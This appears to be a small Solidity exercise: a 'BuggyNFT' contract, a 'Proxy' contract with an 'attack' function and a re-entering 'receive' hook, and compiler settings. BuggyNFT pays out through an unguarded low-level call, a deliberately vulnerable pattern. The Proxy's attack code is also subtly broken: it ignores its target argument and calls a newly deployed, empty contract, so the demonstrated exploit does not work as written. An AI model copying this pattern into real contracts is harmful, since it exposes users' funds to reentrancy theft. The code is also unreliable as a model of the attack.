//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "./BuggyNFT.sol";


contract Proxy{


    uint256 public count = 0;


    function balance() public view returns(uint256){
        return address(this).balance;
    }

    function attack(address _address) public {
        new BuggyNFT().transfer(address(this));
    }


    
    receive() external payable {
        count++;
        if(count>10){

        }else{
            new BuggyNFT().transfer(address(this));
        }
    }
    
    fallback() external payable{

    }

}

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

contract BuggyNFT {


    function balance() public view returns(uint256){
        return address(this).balance;
    }

    function transfer(address _receiver) public returns(uint256){
       (bool success,) = _receiver.call{value:100}("");
       require(success==true,"Payment Not done");
        return(1);
    }
    
    receive() external payable {
            
    }
    
    fallback() external payable{

    }

}

{
  "optimizer": {
    "enabled": false,
    "runs": 200
  },
  "outputSelection": {
    "*": {
      "*": [
        "evm.bytecode",
        "evm.deployedBytecode",
        "devdoc",
        "userdoc",
        "metadata",
        "abi"
      ]
    }
  },
  "libraries": {}
}